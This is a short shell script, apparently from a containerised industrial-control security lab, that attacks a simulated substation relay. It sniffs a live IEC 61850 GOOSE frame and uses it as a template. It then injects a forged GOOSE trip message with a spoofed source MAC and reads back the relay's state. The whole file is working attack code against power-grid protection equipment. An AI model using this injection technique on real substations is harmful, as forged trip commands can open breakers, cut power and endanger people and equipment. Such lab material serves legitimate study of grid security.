#!/bin/sh
. /usr/local/bin/attack-env.sh
# The station network's interface name can shift across container recreates,
# so resolve it from relay-station's IP rather than assuming a fixed ethN.
target_ip=$(getent hosts relay-station | awk '{print $1}')
net2=$(echo "$target_ip" | cut -d. -f1-2)
iface=$(ip -o -4 addr show | awk -v net="$net2." '$4 ~ "^"net {print $2}' | head -1)
echo "== Using interface $iface for the station network (relay-station=$target_ip) =="
echo "== Capturing a live GOOSE frame to use as the forgery template =="
rm -f /tmp/goose-fresh.pcap /tmp/goose-fresh.pcapng
timeout 6 tcpdump -i "$iface" -w /tmp/goose-fresh.pcap 'vlan and ether proto 0x88b8' >/tmp/goose-capture.log 2>&1
editcap /tmp/goose-fresh.pcap /tmp/goose-fresh.pcapng >/dev/null 2>&1
echo "== Sending forged GOOSE trip (stNum 125, from a different source MAC) =="
python3-rawcap /usr/local/bin/goose-inject.py /tmp/goose-fresh.pcapng "$iface" --revision 3 --state 125 --sequence 0 --trip 1
sleep 1.2
station-client read
